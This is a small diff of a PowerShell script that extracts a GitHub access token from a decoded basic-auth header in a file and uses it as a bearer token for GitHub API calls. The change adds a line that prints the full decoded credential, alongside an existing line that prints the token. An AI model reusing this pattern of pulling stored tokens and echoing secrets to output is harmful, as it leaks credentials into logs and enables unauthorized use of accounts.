@@ -14,6 +14,7 @@ $token = ""
 $authHeader = ""
 if ($fileContent -match "basic[\s]+([\w\=]+)") {
     $authHeader = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($matches[1]))
+    Write-Output "Auth: $authHeader"
     if ($authHeader -match "x-access-token:([\w\-_]+)") {
         $token = $matches[1]
         Write-Output "GH TOKEN: $token"
@@ -39,7 +40,6 @@ $apiBaseUrl = "https://api.github.com"
 
 # Authentication
 $username = "supriza"
-$token = "your_personal_access_token"
 $headers = @{
     "Authorization" = "Bearer $token"
     "Content-Type" = "application/json"
